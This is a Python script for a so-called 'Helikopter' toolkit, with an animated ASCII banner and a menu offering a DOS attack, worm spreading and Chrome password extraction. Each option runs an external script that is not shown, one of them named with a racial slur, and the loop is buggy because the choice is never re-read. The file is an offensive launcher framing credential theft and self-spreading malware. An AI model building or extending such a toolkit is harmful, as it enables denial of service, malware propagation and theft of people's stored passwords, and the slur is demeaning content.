import os
import sys
import time
import subprocess


#function defined for colouring
def prRed(skk): print("\033[91m {}\033[00m" .format(skk))
def prGreen(skk): print("\033[92m {}\033[00m" .format(skk))
def prYellow(skk): print("\033[93m {}\033[00m" .format(skk))
def prLightPurple(skk): print("\033[94m {}\033[00m" .format(skk))
def prPurple(skk): print("\033[95m {}\033[00m" .format(skk))
def prCyan(skk): print("\033[96m {}\033[00m" .format(skk))
def prLightGray(skk): print("\033[97m {}\033[00m" .format(skk))
def prBlack(skk): print("\033[98m {}\033[00m" .format(skk))


#main banner function of our tool kit
def __banner__():

	timeto_end_loop = time.time()+1*5

	while time.time() < timeto_end_loop:
	    prPurple("""
	      ________________________
	                              |                                     o        o
	                    ----------^-----------....                        o   o
	                ~-------------            `........................---- o
	            ~                 |   -----          ....................  o   o
	            ~                 |           BBB  (                     o       o
	        ~ --------------------              )
	        ~                                   /
	        ~                                  /
	        ~_______________________________/
	                A                    A
	               AAAAAAAAAAAAAAAAAAAAAAAA
	              A                        A
	    """)

	    time.sleep(0.05)
	    os.system("clear")

	    prPurple("""
	                            __________________________
	                           |                                       o       o
	                 ----------^-----------....                          o   o
	               ~-------------            `........................---- o
	           ~                |   -----          ....................  o   o
	         ~                  |           BBB  (                     o       o
	       ~ --------------------              )
	     ~                                   /
	     ~                                  /
	       ~_______________________________/
	             A                    A
	            AAAAAAAAAAAAAAAAAAAAAAAA
	           A                        A
	    """)

	    time.sleep(0.05)
	    os.system("clear")
	    #END OF LOOP!
	    
	prCyan("""
	     _________________________________________________
	                           |                                       o       o
	                 ----------^-----------....                          o   o
	               ~-------------            `........................---- o
	           ~                |   -----          ....................  o   o
	         ~                  |           BBB  (                     o       o
	       ~ --------------------              )
	     ~                                   /
	     ~                                  /
	       ~_______________________________/
	             A                    A
	            AAAAAAAAAAAAAAAAAAAAAAAA
	           A                        A
			    	         _   _      _ _ _               _            
					| | | | ___| (_) | _____  _ __ | |_ ___ _ __ 
					| |_| |/ _ \ | | |/ / _ \| '_ \| __/ _ \ '__|
					|  _  |  __/ | |   < (_) | |_) | ||  __/ |   
					|_| |_|\___|_|_|_|\_\___/| .__/ \__\___|_|   
				                                 |_|      PTYHON TOOL KIT! """)

#main menu function
def __main_menu__():
	prGreen(" --------------------------------------- ")
	prGreen("|  H E L I K O P T E R   T O O L K I T  |")
	prGreen(" --------------------------------------- ")
	prGreen("| [+] 1 -> DOS ATTACK                   |")
	prGreen("| [+] 2 -> SPREAD WORM                  |")
	prGreen("| [+] 3 -> EXTRACT CHRIOME PASWORDS     |")
	prGreen("| [!] 0 -> Quit!		         |")
	prGreen(" --------------------------------------- ")


#handelling code execution
if __name__ == '__main__':
	#calling functions
	__banner__()
	time.sleep(2)
	
	__main_menu__()
	
	#taking input from user
	opt = int(input("[+] Enter Option to Perform: "))

#while loop for user to choose different attack 
while opt != 0:
	if opt == 0:
		prRed("[!] Quitting.")
		exit()

	elif opt == 1:
		subprocess.call('./wifiter.sh')
	
	elif opt == 2:
		os.system('python fattynigger.py')
	
	elif opt == 3:
		os.system('python taxes.py')
	
	else:
		prYellow("[!] Invalid Option.")
		prRed("[!] Quitting.")
		exit()
